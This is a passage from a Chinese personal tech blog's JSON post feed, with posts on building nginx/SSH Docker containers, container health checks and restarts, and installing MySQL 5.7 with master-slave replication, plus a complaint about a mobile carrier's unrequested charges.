/var/run/sshd \\ &amp;&amp; chmod +x /etc/init.d/nginx \\ &amp;&amp; rm -rf /root/*.cfg \\ &amp;&amp; echo &quot;Asia/Shanghai&quot; &gt; /etc/localtime COPY ssl/* /usr/local/nginx/ssl/ COPY vhost/* /usr/local/nginx/conf/vhost/ COPY nginx.conf /usr/local/nginx/conf/ COPY ssh/* /root/.ssh/ VOLUME [&quot;/www&quot;,&quot;/var/log/wwwlogs&quot;,&quot;/usr/local/nginx/ssl&quot;,&quot;/usr/local/nginx/conf/vhost&quot;] EXPOSE 65422 80 443 HEALTHCHECK CMD curl -fs http://localhost/ || exit 1 ENTRYPOINT /etc/init.d/nginx start &amp;&amp; chown -R www:www /var/log/wwwlogs/ &amp;&amp; /usr/sbin/sshd -D其中 HEALTHCHECK CMD curl -fs http://localhost/ || exit 1就是增加的健康监测配置，然后编译后启动，查看进程会发现其状态是 starting [root@aliyun ~]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 7714a84063ee 677 &quot;/bin/sh -c &apos;/etc/ini&quot; 3 seconds ago Up 2 seconds (health: starting) 0.0.0.0:80-&gt;80/tcp, 0.0.0.0:443-&gt;443/tcp, 0.0.0.0:65423-&gt;65422/tcp blog稍等查看，会发现其状态为 healthy [root@aliyun ~]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 7714a84063ee 677 &quot;/bin/sh -c &apos;/etc/ini&quot; About a minute ago Up About a minute (healthy) 0.0.0.0:80-&gt;80/tcp, 0.0.0.0:443-&gt;443/tcp, 0.0.0.0:65423-&gt;65422/tcp blog我们可以通过 inspect 查看 最近3次的状态 [root@aliyun ~]# docker inspect --format &apos;{{json .State.Health}}&apos; blog | python -m json.tool { &quot;FailingStreak&quot;: 0, &quot;Log&quot;: [ { &quot;End&quot;: &quot;2017-10-11T11:15:27.516562686+08:00&quot;, &quot;ExitCode&quot;: 0, &quot;Output&quot;: &quot;&lt;html&gt;\\r\\n&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body bgcolor=\\&quot;white\\&quot;&gt;\\r\\n&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;\\r\\n&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;\\r\\n&quot;, &quot;Start&quot;: &quot;2017-10-11T11:15:27.470554485+08:00&quot; }, { &quot;End&quot;: &quot;2017-10-11T11:15:57.563377729+08:00&quot;, &quot;ExitCode&quot;: 0, &quot;Output&quot;: &quot;&lt;html&gt;\\r\\n&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body bgcolor=\\&quot;white\\&quot;&gt;\\r\\n&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;\\r\\n&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;\\r\\n&quot;, &quot;Start&quot;: &quot;2017-10-11T11:15:57.516690754+08:00&quot; }, { &quot;End&quot;: &quot;2017-10-11T11:16:27.609685416+08:00&quot;, &quot;ExitCode&quot;: 0, &quot;Output&quot;: &quot;&lt;html&gt;\\r\\n&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body bgcolor=\\&quot;white\\&quot;&gt;\\r\\n&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;\\r\\n&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;\\r\\n&quot;, &quot;Start&quot;: &quot;2017-10-11T11:16:27.563533362+08:00&quot; }, { &quot;End&quot;: &quot;2017-10-11T11:16:57.654441173+08:00&quot;, &quot;ExitCode&quot;: 0, &quot;Output&quot;: &quot;&lt;html&gt;\\r\\n&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body bgcolor=\\&quot;white\\&quot;&gt;\\r\\n&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;\\r\\n&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;\\r\\n&quot;, &quot;Start&quot;: &quot;2017-10-11T11:16:57.609810588+08:00&quot; }, { &quot;End&quot;: &quot;2017-10-11T11:17:27.701113019+08:00&quot;, &quot;ExitCode&quot;: 0, &quot;Output&quot;: &quot;&lt;html&gt;\\r\\n&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body bgcolor=\\&quot;white\\&quot;&gt;\\r\\n&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;\\r\\n&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;\\r\\n&quot;, &quot;Start&quot;: &quot;2017-10-11T11:17:27.654580727+08:00&quot; } ], &quot;Status&quot;: &quot;healthy&quot; }如果健康检查连续失败超过了重试次数，状态就会变为 (unhealthy)。","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"如何投诉运营商","slug":"如何投诉运营商","date":"2017-10-10T11:54:13.000Z","updated":"2021-02-26T06:05:29.327Z","comments":true,"path":"posts/28418.html","link":"","permalink":"https://awen.me/posts/28418.html","excerpt":"这个十一和中秋连着的，我就回了一趟老家，早上八点半出发，晚上十点才到家吃上饭。着实累了，第二天早上我外婆拿着手机来找我，那是我去年过年在京东买的老人机，然后去家里的移动运营商给她老人家办理了个最便宜的套餐。我给办的，8块钱一个月，因为老人平时就接个电话，即使是接个电话外婆也学了很久。当时办理的时候营业厅没有说有开通任何附加套餐。而我外婆向我反映他每个月花费都超过40多，之前找村里一个比较年轻的人给打了10086 问了，要求以后不要在乱开通，我下了个安徽移动的 APP 查了下仅仅增值业务费就38元。包括彩铃、手机阅读信息费、视频信息费等等乱七八糟的业务。你说我外婆这辈子都没怎么出国门，普通话都不会说的人，肯定不会自己找移动办理这个套餐，而且他的手机根本就不可能上网看视频的，那只有一种可能，这个业务是移动公司给私自加的。","text":"这个十一和中秋连着的，我就回了一趟老家，早上八点半出发，晚上十点才到家吃上饭。着实累了，第二天早上我外婆拿着手机来找我，那是我去年过年在京东买的老人机，然后去家里的移动运营商给她老人家办理了个最便宜的套餐。我给办的，8块钱一个月，因为老人平时就接个电话，即使是接个电话外婆也学了很久。当时办理的时候营业厅没有说有开通任何附加套餐。而我外婆向我反映他每个月花费都超过40多，之前找村里一个比较年轻的人给打了10086 问了，要求以后不要在乱开通，我下了个安徽移动的 APP 查了下仅仅增值业务费就38元。包括彩铃、手机阅读信息费、视频信息费等等乱七八糟的业务。你说我外婆这辈子都没怎么出国门，普通话都不会说的人，肯定不会自己找移动办理这个套餐，而且他的手机根本就不可能上网看视频的，那只有一种可能，这个业务是移动公司给私自加的。 于是我打10086 准备投诉，可是连打了五六个电话都打不进人工，我就去微博投诉了，结果2个小时内就响应了。另外我还去工信部投诉，因为之前处理客户问题，经常有客户遇到运营商 DNS 劫持的问题，只要投诉处理效率那是非常快。 后来我查了下我妈的手机也是一样的情况，套餐都一样。 今天上班移动的给我打电话，我没接，结果他们加了我微信，告诉我处理完了，要我撤诉。 刚好看见小道消息也发了一篇吐槽运营商的文章 附： 工信部投诉地址","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"让 docker 容器开机自启动","slug":"让-docker-容器开机自启动","date":"2017-10-10T10:01:31.000Z","updated":"2021-02-26T06:05:29.356Z","comments":true,"path":"posts/74.html","link":"","permalink":"https://awen.me/posts/74.html","excerpt":"","text":"把自己的博客用 dockerfile 构建了一个镜像，其实就是把 nginx 环境包括 https 等等配置都打包了扔容器挂载外面的目录去访问，但是有个问题，就是如果重启宿主机，容器就无法启动，本来还试着把启动命令写到 /etc/rc.local 下。结果发现 docker 本来就有一个参数 docker run --restart=always -d -v /www:/www -v /wwwlogs:/var/log/wwwlogs -p 65423:22 -p 80:80 -p 443:443 e92其中 docker run --restart=always ……就是让容器自动重启的。 这里遇到一个错误 ➜ www docker run -d --name web -p 80:80 -p 443:443 -p 65422:65422 677 9145cda0615ada05cf8cc2038b6f9d6f254c4a8fb94ce73fd57986d80eadb7c3 docker: Error response from daemon: driver failed programming external connectivity on endpoint web (986e3397ec86265874cffc000483c9e749ba487401a41dda1dbbb10dca54c73a): Error starting userland proxy: Bind for 0.0.0.0:80: unexpected error (Failure EADDRINUSE).该错误表示当前宿主机的端口 80 已经被占用。","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"在 Docker 配置 ssh 登陆","slug":"在-Docker-配置-ssh-登陆","date":"2017-10-10T01:10:56.000Z","updated":"2021-02-26T06:05:29.322Z","comments":true,"path":"posts/28027.html","link":"","permalink":"https://awen.me/posts/28027.html","excerpt":"安装 opensshyum -y install openssh-server启动 sshd 进程 [root@nginx-94711 opt]# /usr/sbin/sshd -D Could not load host key: /etc/ssh/ssh_host_rsa_key Could not load host key: /etc/ssh/ssh_host_ecdsa_key Could not load host key: /etc/ssh/ssh_host_ed25519_key sshd: no hostkeys available -- exiting.","text":"安装 opensshyum -y install openssh-server启动 sshd 进程 [root@nginx-94711 opt]# /usr/sbin/sshd -D Could not load host key: /etc/ssh/ssh_host_rsa_key Could not load host key: /etc/ssh/ssh_host_ecdsa_key Could not load host key: /etc/ssh/ssh_host_ed25519_key sshd: no hostkeys available -- exiting. 会提示错误，dockerfile 文件需要这样定义 FROM centos WORKDIR /opt/ COPY CentOS7-Base-163.repo /etc/yum.repos.d/CentOS-Base.repo COPY nginx /etc/init.d/nginx RUN yum -y update \\ &amp;&amp; yum -y install openssh-server openssl gcc gcc-c++ pcre-devel openssl-devel zlib-devel wget make perl vim tar curl rsync bzip2 iptables tcpdump less telnet net-tools lsof python-setuptools lsof sysstat cronie \\ &amp;&amp; wget -c -4 https://nginx.org/download/nginx-1.13.5.tar.gz \\ &amp;&amp; wget -c -4 https://www.openssl.org/source/openssl-1.0.2l.tar.gz \\ &amp;&amp; wget -c -4 ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.41.tar.gz \\ &amp;&amp; wget -c -4 http://zlib.net/zlib-1.2.11.tar.gz \\ &amp;&amp; groupadd -r www &amp;&amp; useradd -r -g www www \\ &amp;&amp; tar zxvf zlib-1.2.11.tar.gz \\ &amp;&amp; cd zlib-1.2.11 \\ &amp;&amp; ./configure \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; cd /opt \\ &amp;&amp; tar zxvf pcre-8.41.tar.gz \\ &amp;&amp; cd pcre-8.41 \\ &amp;&amp; ./configure \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; cd /opt \\ &amp;&amp; tar zxvf openssl-1.0.2l.tar.gz \\ &amp;&amp; tar zxvf nginx-1.13.5.tar.gz \\ &amp;&amp; cd nginx-1.13.5 \\ &amp;&amp; ./configure --prefix=/usr/local/nginx --user=www --group=www --with-pcre=/opt/pcre-8.41 --with-http_ssl_module --with-zlib=/opt/zlib-1.2.11 --with-openssl=/opt/openssl-1.0.2l --with-http_v2_module --with-http_ssl_module \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; rm -rf /opt/* \\ &amp;&amp; mkdir -p /usr/local/nginx/ssl \\ &amp;&amp; mkdir -p /usr/local/nginx/conf/vhost \\ &amp;&amp; mkdir -p /var/log/wwwlogs/ \\ &amp;&amp; mkdir -p /www/ \\ &amp;&amp; ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key -N &apos;&apos; \\ &amp;&amp; ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key -N &apos;&apos; \\ &amp;&amp; ssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key -N &apos;&apos; \\ &amp;&amp; ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N &apos;&apos; \\ &amp;&amp; echo &quot;RSAAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config \\ &amp;&amp; echo &quot;PubkeyAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config \\ &amp;&amp; sed -i &quot;s/PasswordAuthentication yes/PasswordAuthentication no/g&quot; /etc/ssh/sshd_config \\ &amp;&amp; sed -i &quot;s/UsePAM yes/UsePAM no/g&quot; /etc/ssh/sshd_config \\ &amp;&amp; yum clean all \\ &amp;&amp; mkdir /var/run/sshd \\ &amp;&amp; chmod +x /etc/init.d/nginx COPY ssl/* /usr/local/nginx/ssl/ COPY vhost/* /usr/local/nginx/conf/vhost/ COPY nginx.conf /usr/local/nginx/conf/ COPY ssh/* /root/.ssh/ RUN rm -rf /root/*.cfg VOLUME [&quot;/www&quot;,&quot;/var/log/wwwlogs&quot;] EXPOSE 22 80 443 ENTRYPOINT /etc/init.d/nginx start &amp;&amp; chown -R www:www /var/log/wwwlogs/ &amp;&amp; /usr/sbin/sshd -D主要是这一段用来定义 ssh 服务的相关配置，比如生成 sshd 公钥秘钥 配置 sshd_config &amp;&amp; ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key -N &apos;&apos; \\ &amp;&amp; ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key -N &apos;&apos; \\ &amp;&amp; ssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key -N &apos;&apos; \\ &amp;&amp; ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N &apos;&apos; \\ &amp;&amp; echo &quot;RSAAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config \\ &amp;&amp; echo &quot;PubkeyAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config \\ &amp;&amp; sed -i &quot;s/PasswordAuthentication yes/PasswordAuthentication no/g&quot; /etc/ssh/sshd_config \\ &amp;&amp; sed -i &quot;s/UsePAM yes/UsePAM no/g&quot; /etc/ssh/sshd_config \\ 如果希望能够 ssh 进去，还需要把对应的公钥复制进行 COPY ssh/id_rsa.pub /root/.ssh/然后就可以远程了。 docker run -d -P --name web -v /www:/www -P --name log -v /wwwlogs:/var/log/wwwlogs -p 65423:22 -p 80:80 -p 443:443 44c远程 ➜ ~ ssh root@xxxx -p 65423 [root@80487e28cef4 ~]#","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"为什么编译 Dockerfile 有好几个 G","slug":"为什么编译-Dockerfile-显示Sending-build-context-to-Docker-daemon-好几个-G","date":"2017-10-09T07:23:27.000Z","updated":"2021-02-26T06:05:29.297Z","comments":true,"path":"posts/49802.html","link":"","permalink":"https://awen.me/posts/49802.html","excerpt":"","text":"在写完 dockerfile 文件后，我把他保存在一个目录下，该目录下除了 dockerfile 文件还有其他文件，然后执行编译命令，发现 Sending build context to Docker daemon 2.472GB。 ➜ Downloads docker build -t nginx:v2 . Sending build context to Docker daemon 2.472GB这是为什么呢？ 因为 Docker Client会默认发送Dockerfile同级目录下的所有文件到Dockerdaemon中。解决办法就是新建一个目录，把 dockerfile 文件放进去在该目录下执行就可以了。另外一种做法则是创建.dockerignore文件，把不需要的文件写到里面，该文件包含的目录不会被发送到Docker daemon中","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"Docker一运行就退出是怎么回事？","slug":"Docker一运行就退出是怎么回事？","date":"2017-10-09T07:14:38.000Z","updated":"2021-02-26T06:05:29.245Z","comments":true,"path":"posts/42316.html","link":"","permalink":"https://awen.me/posts/42316.html","excerpt":"最近在看 Docker，使用 dockerfile 写了一个 nginx 的容器编译执行后启动 nginx 就立马退出了容器。","text":"最近在看 Docker，使用 dockerfile 写了一个 nginx 的容器编译执行后启动 nginx 就立马退出了容器。 下面是一开始的文件内容 FROM centos WORKDIR /opt/ RUN yum -y update \\ &amp;&amp; yum -y install gcc gcc-c++ pcre-devel openssl-devel zlib-devel wget make perl net-tools \\ &amp;&amp; wget -c https://nginx.org/download/nginx-1.12.1.tar.gz \\ &amp;&amp; wget -c https://www.openssl.org/source/openssl-1.0.2l.tar.gz \\ &amp;&amp; wget -c ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.41.tar.gz \\ &amp;&amp; wget -c http://zlib.net/zlib-1.2.11.tar.gz \\ &amp;&amp; wget -c -4 https://file.awen.me/script/nginx.sh \\ &amp;&amp; groupadd -r www &amp;&amp; useradd -r -g www www \\ &amp;&amp; tar zxvf zlib-1.2.11.tar.gz \\ &amp;&amp; cd zlib-1.2.11 \\ &amp;&amp; ./configure \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; cd /opt \\ &amp;&amp; tar zxvf pcre-8.41.tar.gz \\ &amp;&amp; cd pcre-8.41 \\ &amp;&amp; ./configure \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; cd /opt \\ &amp;&amp; tar zxvf openssl-1.0.2l.tar.gz \\ &amp;&amp; tar zxvf nginx-1.12.1.tar.gz \\ &amp;&amp; cd nginx-1.12.1 \\ &amp;&amp; ./configure --prefix=/usr/local/nginx --user=www --group=www --with-pcre=/opt/pcre-8.41 --with-http_ssl_module --with-zlib=/opt/zlib-1.2.11 --with-openssl=/opt/openssl-1.0.2l \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; mv /opt/nginx.sh /etc/init.d/nginx \\ &amp;&amp; rm -rf /opt/* \\ &amp;&amp; chmod +x /etc/init.d/nginx VOLUME /home/wwwroot/ EXPOSE 80 443 ENTRYPOINT /etc/init.d/nginx start主要是最后一句 ENTRYPOINT /etc/init.d/nginx start我执行的是nginx后台运行的脚本，脑子里的思维还是停留在虚拟机上，实际上在容器中，如果希望容器执行完程序不退出，需要将其进程置于前台来执行。而上面的命令明显是把进程放在后台运行。当容器执行完后台命令后发现后面就没有命令可以执行了自然就退出了。 所以要改变这个状态，需要把最后一句修改为 CMD [&quot;/usr/local/nginx/sbin/nginx&quot;,&quot;-g&quot;,&quot;daemon off;&quot;]即可，此时运行容器 ➜ nginx docker run -dit -p 8080:80 nginx:v1 f09214b53a05b0663d22ba02f6249c8b5c9e6ad7de31ecc6b110656d020a6099查看进程 ➜ nginx docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES f09214b53a05 nginx:v1 &quot;/usr/local/nginx/...&quot; 1 second ago Up 32 seconds 443/tcp, 0.0.0.0:8080-&gt;80/tcp suspicious_neumann 网友提供的另一种方法: 对于有一些你可能不知道怎么前台运行的程序,提供一个投机方案,你只需要在你启动的命令之后,添加类似于 tail top 这种可以前台运行的程序,这里特别推荐 tail ,然后持续输出你的log文件.还是以上文的web容器为例,我们还可以写成: service nginx start &amp;&amp; service php5-fpm start &amp;&amp; tail -f /var/log/nginx/error.log附个人博客的 dockerfile FROM centos WORKDIR /opt/ RUN yum -y update \\ &amp;&amp; yum -y install gcc gcc-c++ pcre-devel openssl-devel zlib-devel wget make perl \\ &amp;&amp; wget -c https://nginx.org/download/nginx-1.12.1.tar.gz \\ &amp;&amp; wget -c https://www.openssl.org/source/openssl-1.0.2l.tar.gz \\ &amp;&amp; wget -c ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.41.tar.gz \\ &amp;&amp; wget -c http://zlib.net/zlib-1.2.11.tar.gz \\ &amp;&amp; groupadd -r www &amp;&amp; useradd -r -g www www \\ &amp;&amp; tar zxvf zlib-1.2.11.tar.gz \\ &amp;&amp; cd zlib-1.2.11 \\ &amp;&amp; ./configure \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; cd /opt \\ &amp;&amp; tar zxvf pcre-8.41.tar.gz \\ &amp;&amp; cd pcre-8.41 \\ &amp;&amp; ./configure \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; cd /opt \\ &amp;&amp; tar zxvf openssl-1.0.2l.tar.gz \\ &amp;&amp; tar zxvf nginx-1.12.1.tar.gz \\ &amp;&amp; cd nginx-1.12.1 \\ &amp;&amp; ./configure --prefix=/usr/local/nginx --user=www --group=www --with-pcre=/opt/pcre-8.41 --with-http_ssl_module --with-zlib=/opt/zlib-1.2.11 --with-openssl=/opt/openssl-1.0.2l --with-http_v2_module --with-http_ssl_module \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; rm -rf /opt/* \\ &amp;&amp; mkdir -p /usr/local/nginx/ssl \\ &amp;&amp; mkdir -p /usr/local/nginx/conf/vhost \\ &amp;&amp; mkdir -p /var/log/wwwlogs/ \\ &amp;&amp; mkdir -p /www/ VOLUME [&quot;/www/&quot;,&quot;/var/log/wwwlogs/&quot;,&quot;/usr/local/nginx/ssl&quot;,&quot;/usr/local/nginx/conf/&quot;] EXPOSE 80 443 COPY ssl/* /usr/local/nginx/ssl/ COPY vhost/* /usr/local/nginx/conf/vhost/ COPY nginx.conf /usr/local/nginx/conf/ COPY www/ /www/ CMD [&quot;/usr/local/nginx/sbin/nginx&quot;,&quot;-g&quot;,&quot;daemon off;&quot;]","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"mysql5.7.19 迁移数据库失败","slug":"mysql57迁移到网易云失败","date":"2017-09-29T05:30:17.000Z","updated":"2021-02-26T06:05:29.280Z","comments":true,"path":"posts/27747.html","link":"","permalink":"https://awen.me/posts/27747.html","excerpt":"在服务器的 mysql 版本是 mysq l5.7.19，迁移后 mysql 日志内容如下 重点是这里 2017-09-29T13:24:30.716454+08:00 60 [Warning] Timeout waiting for reply of binlog (file: mysql-bin.000002, pos: 1699), semi-sync up to file , position 0.","text":"在服务器的 mysql 版本是 mysq l5.7.19，迁移后 mysql 日志内容如下 重点是这里 2017-09-29T13:24:30.716454+08:00 60 [Warning] Timeout waiting for reply of binlog (file: mysql-bin.000002, pos: 1699), semi-sync up to file , position 0. 这说明 BINLOG 未开启，检查 BINLOG 是否开启 mysql&gt; show variables like &apos;log_%&apos; -&gt; ; +----------------------------------------+---------------------+ | Variable_name | Value | +----------------------------------------+---------------------+ | log_bin | OFF | | log_bin_basename | | | log_bin_index | | | log_bin_trust_function_creators | OFF | | log_bin_use_v1_row_events | OFF | | log_builtin_as_identified_by_password | OFF | | log_error | /var/log/mysqld.log | | log_error_verbosity | 3 | | log_output | FILE | | log_queries_not_using_indexes | OFF | | log_slave_updates | OFF | | log_slow_admin_statements | OFF | | log_slow_slave_statements | OFF | | log_statements_unsafe_for_binlog | ON | | log_syslog | OFF | | log_syslog_facility | daemon | | log_syslog_include_pid | ON | | log_syslog_tag | | | log_throttle_queries_not_using_indexes | 0 | | log_timestamps | UTC | | log_warnings | 2 | +----------------------------------------+---------------------+ 21 rows in set (0.01 sec)发现值为 OFF 编辑 my.cnf vim /etc/my.cnf [mysqld] log-bin=mysql-bin server-id=1重启 service mysql.server start报错 dump data error: [Reason: 2017-09-29 14:42:14 [ERROR] - Could not exec:select * from information_schema.GLOBAL_STATUS where VARIABLE_NAME=&apos;Threads_running&apos;, return:The &apos;INFORMATION_SCHEMA.GLOBAL_STATUS&apos; feature is disabled; see the documentation for &apos;show_compatibility_56&apos; 2017-09-29 14:42:19 [ERROR] - Could not exec:select * from information_schema.GLOBAL_STATUS where VARIABLE_NAME=&apos;Threads_running&apos;, return:The &apos;INFORMATION_SCHEMA.GLOBAL_STATUS&apos; feature is disabled; see the documentation for &apos;show_compatibility_56&apos; 2017-09-29 14:42:24 [ERROR] - Could not exec:select * from information_schema.GLOBAL_STATUS where VARIABLE_NAME=&apos;Threads_running&apos;, return:The &apos;INFORMATION_SCHEMA.GLOBAL_STATUS&apos; feature is disabled; see the documentation for &apos;show_compatibility_56&apos; 2017-09-29 14:42:29 [ERROR] - Checking MySQL workload failed, please retry later ]解决方法是配置文件增加后重启 show_compatibility_56=ON","categories":[],"tags":[]},{"title":"Centos7安装 mysql 5.7 并配置主从复制","slug":"Centos7安装 mysql 5.7 并配置主从","date":"2017-09-29T02:53:59.000Z","updated":"2021-02-26T06:05:29.243Z","comments":true,"path":"posts/34709.html","link":"","permalink":"https://awen.me/posts/34709.html","excerpt":"mysql 5.7安装安装rpm -ivh https://repo.mysql.com//mysql57-community-release-el7-11.noarch.rpm yum install mysql-community-server","text":"mysql 5.7安装安装rpm -ivh https://repo.mysql.com//mysql57-community-release-el7-11.noarch.rpm yum install mysql-community-server 启动systemctl enable mysqld systemctl restart mysqld配置密码在 my.cnf 中 [mysqld] 末尾加入 skip-grant-tables=1重启 mysql systemctl restart mysqld然后输入 mysql 后修改密码 mysql&gt; update user set authentication_string=password(&apos;password&apos;) where user=&apos;root&apos;; Query OK, 1 row affected, 1 warning (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 1 注意：mysql7 的密码字段不是 password 了，而是 authentication_string。 最后，删除 skip-grant-tables=1，重启 mysql。 进入 mysql 命令行后不管做什么操作都提示 ERROR 1820 (HY000): You must reset your password using ALTER USER statement before executing this statement.在 mysql5.7中我们需要使用如下命令更改密码而不能使用 update。 mysql&gt; alter user &apos;root&apos;@&apos;localhost&apos; identified by &apos;123456&apos;; 密码太简单也会报错 ERROR 1819 (HY000): Your password does not satisfy the current policy requirements 将密码设置的复杂点就 OK mysql&gt; alter user &apos;root&apos;@&apos;localhost&apos; identified by &apos; password@#&apos;; Query OK, 0 rows affected (0.00 sec) mysql&gt; flush privileges; Query OK, 0 rows affected (0.00 sec) mysql&gt; show databases; #然后就可以了。 +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | +--------------------+ 4 rows in set (0.00 sec)第二种方法是初次安装完毕后，查看初始化密码，在日志里面看 然后用这个密码登陆后修改密码 主从基本概念mysql主从同步定义 主从同步使得数据可以从一个数据库服务器复制到其他服务器上，在复制数据时，一个服务器充当主服务器（master），其余的服务器充当从服务器（slave）。因为复制是异步进行的，所以从服务器不需要一直连接着主服务器，从服务器甚至可以通过拨号断断续续地连接主服务器。通过配置文件，可以指定复制所有的数据库，某个数据库，甚至是某个数据库上的某个表。 使用主从同步的好处： 通过增加从服务器来提高数据库的性能，在主服务器上执行写入和更新，在从服务器上向外提供读功能，可以动态地调整从服务器的数量，从而调整整个数据库的性能。 提高数据安全-因为数据已复制到从服务器，从服务器可以终止复制进程，所以，可以在从服务器上备份而不破坏主服务器相应数据 在主服务器上生成实时数据，而在从服务器上分析这些数据，从而提高主服务器的性能 主从同步机制Mysql服务器之间的主从同步是基于二进制日志机制，主服务器使用二进制日志来记录数据库的变动情况，从服务器通过读取和执行该日志文件来保持和主服务器的数据一致。 在使用二进制日志时，主服务器的所有操作都会被记录下来，然后从服务器会接收到该日志的一个副本。从服务器可以指定执行该日志中的哪一类事件（譬如只插入数据或者只更新数据），默认会执行日志中的所有语句。 每一个从服务器会记录关于二进制日志的信息：文件名和已经处理过的语句，这样意味着不同的从服务器可以分别执行同一个二进制日志的不同部分，并且从服务器可以随时连接或者中断和服务器的连接。 主服务器和每一个从服务器都必须配置一个唯一的ID号（在my.cnf文件的[mysqld]模块下有一个server-id配置项），另外，每一个从服务器还需要通过CHANGE MASTER TO语句来配置它要连接的主服务器的ip地址，日志文件名称和该日志里面的位置（这些信息存储在主服务器的数据库里） 配置主从的前提条件有很多种配置主从同步的方法，可以总结为如下的步骤： 1．在主服务器上，必须开启二进制日志机制和配置一个独立的ID 2．在每一个从服务器上，配置一个唯一的ID，创建一个用来专门复制主服务器数据的账号 3．在开始复制进程前，在主服务器上记录二进制文件的位置信息 4．如果在开始复制之前，数据库中已经有数据，就必须先创建一个数据快照（可以使用mysqldump导出数据库，或者直接复制数据文件） 5．配置从服务器要连接的主服务器的IP地址和登陆授权，二进制日志文件名和位置 配置主从复制在开始之前，需要配置两台服务器的 mysql.cnf，类似如下设置 log-bin=mysql-bin server-id=1 # 主从 ID 不能一样 show_compatibility_56=ON主服务器配置1.创建一个用户用于同步 grant replication slave on *.* to &apos;sync&apos;@&apos;10.173.32.104&apos; identified by &apos;password@#&apos;;2.查看主服务器信息 mysql&gt; show master status; +------------------+----------+--------------+------------------+-------------------+ | File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set | +------------------+----------+--------------+------------------+-------------------+ | mysql-bin.000004 | 845 | | | | +------------------+----------+--------------+------------------+-------------------+ 1 row in set (0.00 sec)从服务器配置1.配置连接master 的设置 mysql&gt; change master to -&gt; master_host=&apos;10.173.32.103&apos;, # 主服务器的 ip 地址 -&gt; master_port=3306, #主服务器的 mysql 端口 -&gt; master_user=&apos;sync&apos;, # 主服务器上用来配置主从同步的用户名 -&gt; master_password=&apos;password@#&apos;,#主服务器上用来配置主从同步的密码 -&gt; master_log_file=&apos;mysql-bin.000004&apos;, # 主服务器的状态 -&gt; master_log_pos=845; # 主服务器 pos 信息 Query OK, 0 rows affected, 2 warnings (0.05 sec)2.启动从服务器 mysql&gt; start slave; Query OK, 0 rows affected (0.00 sec)3.查看从服务器的状态 mysql&gt; show slave status \\G *************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 10.173.32.103 Master_User: sync Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin.000004 Read_Master_Log_Pos: 845 Relay_Log_File: mysql-slave-relay-bin.000002 Relay_Log_Pos: 320 Relay_Master_Log_File: mysql-bin.000004 Slave_IO_Running: Yes # 